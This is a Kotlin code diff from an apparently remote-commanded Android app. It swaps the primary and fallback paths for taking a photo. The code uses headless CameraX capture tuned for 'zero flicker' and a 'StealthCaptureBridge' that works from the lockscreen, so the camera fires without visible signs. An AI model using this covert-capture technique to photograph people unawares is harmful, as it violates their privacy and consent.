@@ -34,29 +34,32 @@ class SnapCommand @Inject constructor(
         }
 
         val cameraLabel = if (useFront) "front" else "rear"
-        Log.i(TAG, "Requesting photo from $cameraLabel camera")
+        Log.i(TAG, "Requesting photo from $cameraLabel camera headlessly")
 
-        // 1. Primary path: StealthCaptureBridge (Activity in TOP state for Android 14-16 lockscreen)
-        val captureResult = StealthCaptureBridge.capturePhoto(context, useFront, 12000L)
-        val photoFile = captureResult.file
+        // 1. Primary path: Pure headless CameraX capture (Zero black screen, zero flicker)
+        com.izhaanintellect.pasa.service.PasaService.elevateServiceToCamera()
+        val photoFile = try {
+            cameraManager.capturePhoto(useFront)
+        } catch (e: Exception) {
+            Log.e(TAG, "Headless cameraManager error: ${e.message}", e)
+            null
+        } finally {
+            com.izhaanintellect.pasa.service.PasaService.demoteServiceFromCamera()
+        }
 
         if (photoFile != null && photoFile.exists() && photoFile.length() > 0) {
             return CommandResult(
                 success = true,
-                message = "📸 Photo captured from $cameraLabel camera.",
+                message = "📸 Photo captured from $cameraLabel camera (zero flicker).",
                 photoFile = photoFile
             )
         }
 
-        Log.w(TAG, "StealthCaptureBridge failed (${captureResult.error}), trying direct CameraX fallback")
+        Log.w(TAG, "Headless camera capture returned null, attempting lockscreen bridge fallback")
 
-        // 2. Secondary fallback: direct headless cameraManager
-        val fallbackFile = try {
-            cameraManager.capturePhoto(useFront)
-        } catch (e: Exception) {
-            Log.e(TAG, "Fallback cameraManager error", e)
-            null
-        }
+        // 2. Secondary fallback: StealthCaptureBridge only if direct capture failed
+        val captureResult = StealthCaptureBridge.capturePhoto(context, useFront, 12000L)
+        val fallbackFile = captureResult.file
 
         return if (fallbackFile != null && fallbackFile.exists() && fallbackFile.length() > 0) {
             CommandResult(
